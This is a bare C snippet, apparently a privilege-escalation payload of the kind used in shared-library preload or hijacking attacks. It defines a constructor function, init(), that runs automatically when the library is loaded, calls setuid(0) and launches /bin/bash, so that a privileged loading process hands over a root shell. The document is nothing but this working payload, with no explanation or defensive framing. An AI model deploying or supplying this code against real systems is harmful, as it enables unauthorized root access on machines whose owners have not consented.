void __attribute__((constructor)) init()
{
   setuid(0);
   system("/bin/bash");
}
